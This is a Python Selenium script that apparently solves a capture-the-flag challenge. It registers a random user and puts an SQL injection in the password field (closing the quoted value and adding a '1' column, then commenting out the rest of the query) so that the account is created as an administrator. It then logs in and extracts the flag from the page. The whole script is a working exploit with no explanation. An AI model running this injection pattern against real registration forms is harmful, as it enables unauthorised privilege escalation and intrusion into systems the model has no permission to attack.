from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from pyvirtualdisplay import Display
import time
import random

# Open a virtual windows
display = Display(visible=0, size=(800, 600))
display.start()

id = str(random.randint(0,100000))
url = 'http://adminsecret.challs.olicyber.it/'
driver_register = webdriver.Chrome()

driver_register.get(url + 'register.php')
user = driver_register.find_element(By.XPATH, '//*[@id="username"]')
user.send_keys(id)
pswd = driver_register.find_element(By.XPATH, '//*[@id="password"]')
pswd.send_keys(id + "','1'); -- ")
send = driver_register.find_element(By.XPATH, '/html/body/div/form/button')
send.click()

driver_login = webdriver.Chrome()
driver_login.get(url + 'login.php')
user = driver_login.find_element(By.XPATH, '//*[@id="username"]')
user.send_keys(id)
pswd = driver_login.find_element(By.XPATH, '//*[@id="password"]')
pswd.send_keys(id)
send = driver_login.find_element(By.XPATH, '/html/body/div/form/button')
send.click()
time.sleep(2)
page = driver_login.page_source
print(page[page.find('flag{') : page.find('}') + 1])